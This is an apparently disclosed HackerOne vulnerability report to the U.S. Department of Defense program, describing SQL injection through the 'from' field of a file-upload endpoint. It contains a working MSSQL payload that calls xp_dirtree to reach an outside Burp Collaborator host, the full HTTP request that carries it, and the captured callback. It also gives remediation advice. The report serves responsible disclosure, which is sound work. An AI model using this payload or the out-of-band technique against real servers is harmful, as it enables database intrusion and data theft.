---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-10-04
submitted: 2017-09-27T21:36:33.009Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "lfb"
source: "https://hackerone.com/reports/272506"
title: " SQL injections"
---
#  SQL injections

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 13 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-04

- Report: [https://hackerone.com/reports/272506](https://hackerone.com/reports/272506)
- CWE: SQL Injection
- Submitted: 2017-09-27T21:36:33.009Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
An email is not well handeled and leads to sql injection.
**Description:**
This request
POST /FileTransfer/Upload HTTP/1.1
Host: www.███████

The parameter **from** is injectable and leads to valid sql injection.
## Impact
I didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user.

## Step-by-step Reproduction Instructions
Payload injection 
```
';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
```

Request to make execute the sql command 
```
POST /FileTransfer/Upload HTTP/1.1
Host: www.███
Connection: close
Content-Length: 269
Cache-Control: max-age=0
Origin: https://www.████
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: https://www.█████████/FileTransfer/
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4

------WebKitFormBoundarybjrDo2DV1yHQWvAQ
Content-Disposition: form-data; name="from"

hello';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
------WebKitFormBoundarybjrDo2DV1yHQWvAQ
```

first I get a dns query on my burp collaborator (see sqli2.png)

second I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55
```
PROPFIND /random HTTP/1.1
Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
Content-Length: 0
Depth: 0
translate: f
User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
X-BlueCoat-Via: ██████████
```

Also it is easy to see that the single quote breaks the sql syntax.

## Suggested Mitigation/Remediation Actions
Make prepared statement so the **'** doesnt get interpreted. (Input data validation)
Maybe verify other parameters.

## Timeline

- **Report Filed**
- **2017-09-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Triaged**
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
